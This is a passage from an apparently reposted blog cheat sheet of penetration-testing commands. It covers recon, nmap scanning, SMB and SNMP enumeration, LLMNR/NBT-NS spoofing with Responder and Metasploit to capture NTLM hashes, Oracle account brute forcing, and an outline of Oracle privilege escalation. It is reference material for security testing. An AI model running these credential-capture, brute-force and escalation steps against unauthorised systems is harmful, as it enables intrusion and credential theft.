class="toc-text">Spawn Lua TTY Shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-from-Vi"><span class="toc-number">25.6.</span> <span class="toc-text">Spawn TTY Shell from Vi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-NMAP"><span class="toc-number">25.7.</span> <span class="toc-text">Spawn TTY Shell NMAP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Metasploit-Cheat-Sheet"><span class="toc-number">26.</span> <span class="toc-text">Metasploit Cheat Sheet</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Meterpreter-Payloads"><span class="toc-number">26.1.</span> <span class="toc-text">Meterpreter Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-reverse-meterpreter-payload"><span class="toc-number">26.2.</span> <span class="toc-text">Windows reverse meterpreter payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-VNC-Meterpreter-payload"><span class="toc-number">26.3.</span> <span class="toc-text">Windows VNC Meterpreter payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-Reverse-Meterpreter-payload"><span class="toc-number">26.4.</span> <span class="toc-text">Linux Reverse Meterpreter payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter-Cheat-Sheet"><span class="toc-number">27.</span> <span class="toc-text">Meterpreter Cheat Sheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Common-Metasploit-Modules"><span class="toc-number">28.</span> <span class="toc-text">Common Metasploit Modules</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Remote-Windows-Metasploit-Modules-exploits"><span class="toc-number">28.1.</span> <span class="toc-text">Remote Windows Metasploit Modules (exploits)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Local-Windows-Metasploit-Modules-exploits"><span class="toc-number">28.2.</span> <span class="toc-text">Local Windows Metasploit Modules (exploits)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Auxilary-Metasploit-Modules"><span class="toc-number">28.3.</span> <span class="toc-text">Auxilary Metasploit Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Metasploit-Powershell-Modules"><span class="toc-number">28.4.</span> <span class="toc-text">Metasploit Powershell Modules</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Post-Exploit-Windows-Metasploit-Modules"><span class="toc-number">28.5.</span> <span class="toc-text">Post Exploit Windows Metasploit Modules</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASCII-Table-Cheat-Sheet"><span class="toc-number">29.</span> <span class="toc-text">ASCII Table Cheat Sheet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCO-IOS-Commands"><span class="toc-number">30.</span> <span class="toc-text">CISCO IOS Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cryptography"><span class="toc-number">31.</span> <span class="toc-text">Cryptography</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Lengths"><span class="toc-number">31.1.</span> <span class="toc-text">Hash Lengths</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Examples"><span class="toc-number">31.2.</span> <span class="toc-text">Hash Examples</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQLMap-Examples"><span class="toc-number">32.</span> <span class="toc-text">SQLMap Examples</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Cheat Sheet Penetration Testing Tools
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">ZMarvel</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2019-03-02T15:20:34.000Z" itemprop="datePublished">2019-03-02</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/安全技术/">安全技术</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/Penetration/">Penetration</a>, <a class="tag-link" href="/tags/转载/">转载</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <a id="more"></a>
<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><strong>Penetration testing tools cheat sheet</strong>, a quick reference high level overview for typical <a href="https://www.aptive.co.uk/penetration-testing/" target="_blank" rel="external">penetration testing</a> engagements. Designed as a quick reference cheat sheet providing a high level overview of the <strong>typical</strong> commands you would run when performing a penetration test. For more in depth information I’d recommend the man file for the tool or a more specific pen testing cheat sheet from the menu on the right.</p>
<p>The focus of this cheat sheet is infrastructure / network penetration testing, web application penetration testing is not covered here apart from a few sqlmap commands at the end and some web server enumeration. For Web Application Penetration Testing, check out the Web Application Hackers Hand Book, it is excellent for both learning and reference.</p>
<p>If I’m missing any pen testing tools here give me a nudge on twitter.</p>
<h2 id="Pre-engagement"><a href="#Pre-engagement" class="headerlink" title="Pre-engagement"></a>Pre-engagement</h2><h3 id="Network-Configuration"><a href="#Network-Configuration" class="headerlink" title="Network Configuration"></a>Network Configuration</h3><h4 id="Set-IP-Address"><a href="#Set-IP-Address" class="headerlink" title="Set IP Address"></a>Set IP Address</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig eth0 xxx.xxx.xxx.xxx/24</div></pre></td></tr></table></figure>
<h4 id="Subnetting"><a href="#Subnetting" class="headerlink" title="Subnetting"></a>Subnetting</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ipcalc xxx.xxx.xxx.xxx/24</div><div class="line">ipcalc xxx.xxx.xxx.xxx 255.255.255.0</div></pre></td></tr></table></figure>
<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Passive-Information-Gathering"><a href="#Passive-Information-Gathering" class="headerlink" title="Passive Information Gathering"></a>Passive Information Gathering</h3><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><h5 id="WHOIS-enumeration"><a href="#WHOIS-enumeration" class="headerlink" title="WHOIS enumeration"></a>WHOIS enumeration</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">whois domain-name-here.com</div></pre></td></tr></table></figure>
<h5 id="Perform-DNS-IP-Lookup"><a href="#Perform-DNS-IP-Lookup" class="headerlink" title="Perform DNS IP Lookup"></a>Perform DNS IP Lookup</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig a domain-name-here.com @nameserver</div></pre></td></tr></table></figure>
<h5 id="Perform-MX-Record-Lookup"><a href="#Perform-MX-Record-Lookup" class="headerlink" title="Perform MX Record Lookup"></a>Perform MX Record Lookup</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig mx domain-name-here.com @nameserver</div></pre></td></tr></table></figure>
<h5 id="Perform-Zone-Transfer-with-DIG"><a href="#Perform-Zone-Transfer-with-DIG" class="headerlink" title="Perform Zone Transfer with DIG"></a>Perform Zone Transfer with DIG</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig axfr domain-name-here.com @nameserver</div></pre></td></tr></table></figure>
<h2 id="DNS-Zone-Transfers"><a href="#DNS-Zone-Transfers" class="headerlink" title="DNS Zone Transfers"></a>DNS Zone Transfers</h2><table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nslookup -&gt; set type=any -&gt; ls -d blah.com</code></td>
<td>Windows DNS zone transfer</td>
</tr>
<tr>
<td><code>dig axfr blah.com @ns1.blah.com</code></td>
<td>Linux DNS zone transfer</td>
</tr>
</tbody>
</table>
<h4 id="Email"><a href="#Email" class="headerlink" title="Email"></a>Email</h4><h5 id="Simply-Email"><a href="#Simply-Email" class="headerlink" title="Simply Email"></a>Simply Email</h5><p>Use Simply Email to enumerate all the online places (github, target site etc), it works better if you use proxies or set long throttle times so google doesn’t think you’re a robot and make you fill out a Captcha.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/killswitch-GUI/SimplyEmail.git</div><div class="line">./SimplyEmail.py -all -e TARGET-DOMAIN</div></pre></td></tr></table></figure>
<p>Simply Email can verify the discovered email addresss after gathering.</p>
<h3 id="Semi-Active-Information-Gathering"><a href="#Semi-Active-Information-Gathering" class="headerlink" title="Semi Active Information Gathering"></a>Semi Active Information Gathering</h3><h4 id="Basic-Finger-Printing"><a href="#Basic-Finger-Printing" class="headerlink" title="Basic Finger Printing"></a>Basic Finger Printing</h4><p>Manual finger printing / banner grabbing.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nc -v 192.168.1.1 25</code> <code>telnet 192.168.1.1 25</code></td>
<td>Basic versioning / finger printing via displayed banner</td>
</tr>
</tbody>
</table>
<h4 id="Banner-grabbing-with-NC"><a href="#Banner-grabbing-with-NC" class="headerlink" title="Banner grabbing with NC"></a>Banner grabbing with NC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">nc TARGET-IP 80</div><div class="line">GET / HTTP/1.1</div><div class="line">Host: TARGET-IP</div><div class="line">User-Agent: Mozilla/5.0</div><div class="line">Referrer: meh-domain</div><div class="line">&lt;enter&gt;</div></pre></td></tr></table></figure>
<h3 id="Active-Information-Gathering"><a href="#Active-Information-Gathering" class="headerlink" title="Active Information Gathering"></a>Active Information Gathering</h3><h4 id="DNS-Bruteforce"><a href="#DNS-Bruteforce" class="headerlink" title="DNS Bruteforce"></a>DNS Bruteforce</h4><h5 id="DNSRecon"><a href="#DNSRecon" class="headerlink" title="DNSRecon"></a>DNSRecon</h5><p>DNS Enumeration Kali - DNSRecon</p>
<p>root :~#<br>dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std –xml ouput.xml</p>
<h4 id="Port-Scanning"><a href="#Port-Scanning" class="headerlink" title="Port Scanning"></a>Port Scanning</h4><h5 id="Nmap-Commands"><a href="#Nmap-Commands" class="headerlink" title="Nmap Commands"></a>Nmap Commands</h5><p>For more commands, see the Nmap cheat sheet (link in the menu on the right).</p>
<p>Basic Nmap Commands:</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nmap -v -sS -A -T4 target</code></td>
<td>Nmap verbose scan, runs syn stealth, T4 timing (should be ok on LAN), OS and service version info, traceroute and scripts against services</td>
</tr>
<tr>
<td><code>nmap -v -sS -p--A -T4 target</code></td>
<td>As above but scans all TCP ports (takes a lot longer)</td>
</tr>
<tr>
<td><code>nmap -v -sU -sS -p- -A -T4 target</code></td>
<td>As above but scans all TCP ports and UDP scan (takes even longer)</td>
</tr>
<tr>
<td><code>nmap -v -p 445 --script=smb-check-vulns &lt;br&gt;--script-args=unsafe=1 192.168.1.X</code></td>
<td>Nmap script to scan for vulnerable SMB servers - WARNING: unsafe=1 may cause knockover</td>
</tr>
<tr>
<td>`ls /usr/share/nmap/scripts/*</td>
<td>grep ftp`</td>
<td>Search nmap scripts for keywords</td>
</tr>
</tbody>
</table>
<p>I’ve had a few people mention about T4 scans, apply common sense here. Don’t use T4 commands on external pen tests (when using an Internet connection), you’re probably better off using a T2 with a TCP connect scan. A T4 scan would likely be better suited for an internal pen test, over low latency links with plenty of bandwidth. But it all depends on the target devices, embeded devices are going to struggle if you T4 / T5 them and give inconclusive results. As a general rule of thumb, scan as slowly as you can, or do a fast scan for the top 1000 so you can start pen testing then kick off a slower scan.</p>
<h6 id="Nmap-UDP-Scanning"><a href="#Nmap-UDP-Scanning" class="headerlink" title="Nmap UDP Scanning"></a>Nmap UDP Scanning</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sU TARGET</div></pre></td></tr></table></figure>
<h6 id="UDP-Protocol-Scanner"><a href="#UDP-Protocol-Scanner" class="headerlink" title="UDP Protocol Scanner"></a>UDP Protocol Scanner</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/portcullislabs/udp-proto-scanner.git</div></pre></td></tr></table></figure>
<p>Scan a file of IP addresses for all services:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./udp-protocol-scanner.pl -f ip.txt</div></pre></td></tr></table></figure>
<p>Scan for a specific UDP service:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">udp-proto-scanner.pl -p ntp -f ips.txt</div></pre></td></tr></table></figure>
<h6 id="Other-Host-Discovery"><a href="#Other-Host-Discovery" class="headerlink" title="Other Host Discovery"></a>Other Host Discovery</h6><p>Other methods of host discovery, that don’t use nmap…</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>netdiscover -r 192.168.1.0/24</code></td>
<td>Discovers IP, MAC Address and MAC vendor on the subnet from ARP, helpful for confirming you’re on the right VLAN at $client site</td>
</tr>
</tbody>
</table>
<h2 id="Enumeration-amp-Attacking-Network-Services"><a href="#Enumeration-amp-Attacking-Network-Services" class="headerlink" title="Enumeration &amp; Attacking Network Services"></a>Enumeration &amp; Attacking Network Services</h2><p>Penetration testing tools that spefically identify and / or enumerate network services:</p>
<h3 id="SAMB-SMB-Windows-Domain-Enumeration"><a href="#SAMB-SMB-Windows-Domain-Enumeration" class="headerlink" title="SAMB / SMB / Windows Domain Enumeration"></a>SAMB / SMB / Windows Domain Enumeration</h3><h4 id="Samba-Enumeration"><a href="#Samba-Enumeration" class="headerlink" title="Samba Enumeration"></a>Samba Enumeration</h4><h5 id="SMB-Enumeration-Tools"><a href="#SMB-Enumeration-Tools" class="headerlink" title="SMB Enumeration Tools"></a>SMB Enumeration Tools</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">nmblookup -A target</div><div class="line">smbclient //MOUNT/share -I target -N</div><div class="line">rpcclient -U &quot;&quot; target</div><div class="line">enum4linux target</div></pre></td></tr></table></figure>
<p>Also see, nbtscan cheat sheet (right hand menu).</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>nbtscan 192.168.1.0/24</code></td>
<td>Discover Windows / Samba servers on subnet, finds Windows MAC addresses, netbios name and discover client workgroup / domain</td>
</tr>
<tr>
<td><code>enum4linux -a target-ip</code></td>
<td>Do Everything, runs all options (find windows client domain / workgroup) apart from dictionary based share name guessing</td>
</tr>
</tbody>
</table>
<h5 id="Fingerprint-SMB-Version"><a href="#Fingerprint-SMB-Version" class="headerlink" title="Fingerprint SMB Version"></a>Fingerprint SMB Version</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">smbclient -L //192.168.1.100</div></pre></td></tr></table></figure>
<h5 id="Find-open-SMB-Shares"><a href="#Find-open-SMB-Shares" class="headerlink" title="Find open SMB Shares"></a>Find open SMB Shares</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24</div></pre></td></tr></table></figure>
<h5 id="Enumerate-SMB-Users"><a href="#Enumerate-SMB-Users" class="headerlink" title="Enumerate SMB Users"></a>Enumerate SMB Users</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">python /usr/share/doc/python-impacket-doc/examples</div><div class="line">/samrdump.py 192.168.XXX.XXX</div></pre></td></tr></table></figure>
<p>RID Cycling:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ridenum.py 192.168.XXX.XXX 500 50000 dict.txt</div></pre></td></tr></table></figure>
<p>Metasploit module for RID cycling:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_lookupsid</div></pre></td></tr></table></figure>
<h5 id="Manual-Null-session-testing"><a href="#Manual-Null-session-testing" class="headerlink" title="Manual Null session testing:"></a>Manual Null session testing:</h5><p>Windows:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net use \\TARGET\IPC$ &quot;&quot; /u:&quot;&quot;</div></pre></td></tr></table></figure>
<p>Linux:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">smbclient -L //192.168.99.131</div></pre></td></tr></table></figure>
<h5 id="NBTScan-unixwiz"><a href="#NBTScan-unixwiz" class="headerlink" title="NBTScan unixwiz"></a>NBTScan unixwiz</h5><p>Install on Kali rolling:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install nbtscan-unixwiz</div><div class="line">nbtscan-unixwiz -f 192.168.0.1-254 &gt; nbtscan</div></pre></td></tr></table></figure>
<h3 id="LLMNR-NBT-NS-Spoofing"><a href="#LLMNR-NBT-NS-Spoofing" class="headerlink" title="LLMNR / NBT-NS Spoofing"></a>LLMNR / NBT-NS Spoofing</h3><p>Steal credentials off the network.</p>
<h5 id="Metasploit-LLMNR-NetBIOS-requests"><a href="#Metasploit-LLMNR-NetBIOS-requests" class="headerlink" title="Metasploit LLMNR / NetBIOS requests"></a>Metasploit LLMNR / NetBIOS requests</h5><p>Spoof / poison LLMNR / NetBIOS requests:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auxiliary/spoof/llmnr/llmnr_response</div><div class="line">auxiliary/spoof/nbns/nbns_response</div></pre></td></tr></table></figure>
<p>Capture the hashes:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">auxiliary/server/capture/smb</div><div class="line">auxiliary/server/capture/http_ntlm</div></pre></td></tr></table></figure>
<p>You’ll end up with NTLMv2 hash, use john or hashcat to crack it.</p>
<h4 id="Responder-py"><a href="#Responder-py" class="headerlink" title="Responder.py"></a>Responder.py</h4><p>Alternatively you can use responder.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/SpiderLabs/Responder.git</div><div class="line">python Responder.py -i local-ip -I eth0</div></pre></td></tr></table></figure>
<h5 id="Run-Responder-py-for-the-whole-engagement"><a href="#Run-Responder-py-for-the-whole-engagement" class="headerlink" title="Run Responder.py for the whole engagement"></a>Run Responder.py for the whole engagement</h5><p>Run Responder.py for the length of the engagement while you’re working on other attack vectors.</p>
<h3 id="SNMP-Enumeration-Tools"><a href="#SNMP-Enumeration-Tools" class="headerlink" title="SNMP Enumeration Tools"></a>SNMP Enumeration Tools</h3><p>A number of SNMP enumeration tools.</p>
<p>Fix SNMP output values so they are human readable:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install snmp-mibs-downloader download-mibs</div><div class="line">echo &quot;&quot; &gt; /etc/snmp/snmp.conf</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>snmpcheck -t 192.168.1.X -c public</code> `snmpwalk -c public -v1 192.168.1.X 1</td>
<td><br> grep hrSWRunName</td>
<td>cut -d<em> </em> -f <code>`snmpenum -t 192.168.1.X</code> <code>onesixtyone -c names -i hosts</code></td>
<td>SNMP enumeration</td>
</tr>
</tbody>
</table>
<h4 id="SNMPv3-Enumeration-Tools"><a href="#SNMPv3-Enumeration-Tools" class="headerlink" title="SNMPv3 Enumeration Tools"></a>SNMPv3 Enumeration Tools</h4><p>Idenitfy SNMPv3 servers with nmap:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -p 161 --script=snmp-info TARGET-SUBNET</div></pre></td></tr></table></figure>
<p>Rory McCune’s snmpwalk wrapper script helps automate the username enumeration process for SNMPv3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">apt-get install snmp snmp-mibs-downloader</div><div class="line">wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb</div></pre></td></tr></table></figure>
<h5 id="Use-Metasploits-Wordlist"><a href="#Use-Metasploits-Wordlist" class="headerlink" title="Use Metasploits Wordlist"></a>Use Metasploits Wordlist</h5><p>Metasploit’s wordlist (KALI path below) has common credentials for v1 &amp; 2 of SNMP, for newer credentials check out Daniel Miessler’s SecLists project on GitHub (not the mailing list!).</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt</div></pre></td></tr></table></figure>
<h3 id="R-Services-Enumeration"><a href="#R-Services-Enumeration" class="headerlink" title="R Services Enumeration"></a>R Services Enumeration</h3><p>This is legacy, included for completeness.</p>
<p>nmap -A will perform all the rservices enumeration listed below, this section has been added for completeness or manual confirmation:</p>
<h4 id="RSH-Enumeration"><a href="#RSH-Enumeration" class="headerlink" title="RSH Enumeration"></a>RSH Enumeration</h4><h5 id="RSH-Run-Commands"><a href="#RSH-Run-Commands" class="headerlink" title="RSH Run Commands"></a>RSH Run Commands</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rsh &lt;target&gt; &lt;command&gt;</div></pre></td></tr></table></figure>
<h5 id="Metasploit-RSH-Login-Scanner"><a href="#Metasploit-RSH-Login-Scanner" class="headerlink" title="Metasploit RSH Login Scanner"></a>Metasploit RSH Login Scanner</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">auxiliary/scanner/rservices/rsh_login</div></pre></td></tr></table></figure>
<h5 id="rusers-Show-Logged-in-Users"><a href="#rusers-Show-Logged-in-Users" class="headerlink" title="rusers Show Logged in Users"></a>rusers Show Logged in Users</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rusers -al 192.168.2.1</div></pre></td></tr></table></figure>
<h5 id="rusers-scan-whole-Subnet"><a href="#rusers-scan-whole-Subnet" class="headerlink" title="rusers scan whole Subnet"></a>rusers scan whole Subnet</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rlogin -l &lt;user&gt; &lt;target&gt;</div></pre></td></tr></table></figure>
<p>e.g rlogin -l root TARGET-SUBNET/24</p>
<h3 id="Finger-Enumeration"><a href="#Finger-Enumeration" class="headerlink" title="Finger Enumeration"></a>Finger Enumeration</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">finger @TARGET-IP</div></pre></td></tr></table></figure>
<h4 id="Finger-a-Specific-Username"><a href="#Finger-a-Specific-Username" class="headerlink" title="Finger a Specific Username"></a>Finger a Specific Username</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">finger batman@TARGET-IP</div></pre></td></tr></table></figure>
<h4 id="Solaris-bug-that-shows-all-logged-in-users"><a href="#Solaris-bug-that-shows-all-logged-in-users" class="headerlink" title="Solaris bug that shows all logged in users:"></a>Solaris bug that shows all logged in users:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">finger 0@host</div><div class="line"></div><div class="line">SunOS: RPC services allow user enum:</div><div class="line">$ rusers # users logged onto LAN</div><div class="line"></div><div class="line">finger &apos;a b c d e f g h&apos;@sunhost</div></pre></td></tr></table></figure>
<h3 id="rwho"><a href="#rwho" class="headerlink" title="rwho"></a>rwho</h3><p>Use nmap to identify machines running rwhod (513 UDP)</p>
<h2 id="TLS-amp-SSL-Testing"><a href="#TLS-amp-SSL-Testing" class="headerlink" title="TLS &amp; SSL Testing"></a>TLS &amp; SSL Testing</h2><h3 id="testssl-sh"><a href="#testssl-sh" class="headerlink" title="testssl.sh"></a>testssl.sh</h3><p>Test all the things on a single host and output to a .html file:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha &gt; OUTPUT-FILE.html</div></pre></td></tr></table></figure>
<h2 id="Vulnerability-Assessment"><a href="#Vulnerability-Assessment" class="headerlink" title="Vulnerability Assessment"></a>Vulnerability Assessment</h2><p>Install OpenVAS 8 on Kali Rolling:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-get update</div><div class="line">apt-get dist-upgrade -y</div><div class="line">apt-get install openvas</div><div class="line">openvas-setup</div></pre></td></tr></table></figure>
<p>Verify openvas is running using:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -tulpn</div></pre></td></tr></table></figure>
<p>Login at <a href="https://127.0.0.1:9392" target="_blank" rel="external">https://127.0.0.1:9392</a> - credentials are generated during openvas-setup.</p>
<h2 id="Database-Penetration-Testing"><a href="#Database-Penetration-Testing" class="headerlink" title="Database Penetration Testing"></a>Database Penetration Testing</h2><p>Attacking database servers exposed on the network.</p>
<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>Install oscanner:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install oscanner</div></pre></td></tr></table></figure>
<p>Run oscanner:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">oscanner -s 192.168.1.200 -P 1521</div></pre></td></tr></table></figure>
<h4 id="Fingerprint-Oracle-TNS-Version"><a href="#Fingerprint-Oracle-TNS-Version" class="headerlink" title="Fingerprint Oracle TNS Version"></a>Fingerprint Oracle TNS Version</h4><p>Install tnscmd10g:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install tnscmd10g</div></pre></td></tr></table></figure>
<p>Fingerprint oracle tns:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tnscmd10g version -h TARGET</div><div class="line">nmap --script=oracle-tns-version</div></pre></td></tr></table></figure>
<h4 id="Brute-force-oracle-user-accounts"><a href="#Brute-force-oracle-user-accounts" class="headerlink" title="Brute force oracle user accounts"></a>Brute force oracle user accounts</h4><p>Identify default Oracle accounts:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nmap --script=oracle-sid-brute</div><div class="line">nmap --script=oracle-brute</div></pre></td></tr></table></figure>
<p>Run nmap scripts against Oracle TNS:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p 1521 -A TARGET</div></pre></td></tr></table></figure>
<h4 id="Oracle-Privilege-Escalation"><a href="#Oracle-Privilege-Escalation" class="headerlink" title="Oracle Privilege Escalation"></a>Oracle Privilege Escalation</h4><p>Requirements:</p>
<ul>
<li>Oracle needs to be exposed on the network</li>
<li>A default account is in use like scott</li>
</ul>
<p>Quick overview of how this works:</p>
<ol>
<li>Create the function</li>
<li>Create an index on table SYS.DUAL</li>
<li>The index we just created executes our function SCOTT.DBA_X</li>
<li>The function will be executed by SYS user (as that’s the user that owns the table).</li>
<li>Create an account with DBA priveleges</li>
</ol>
<p>In the example below the user SCOTT is used but this should be possible with another default Oracle account.</p>
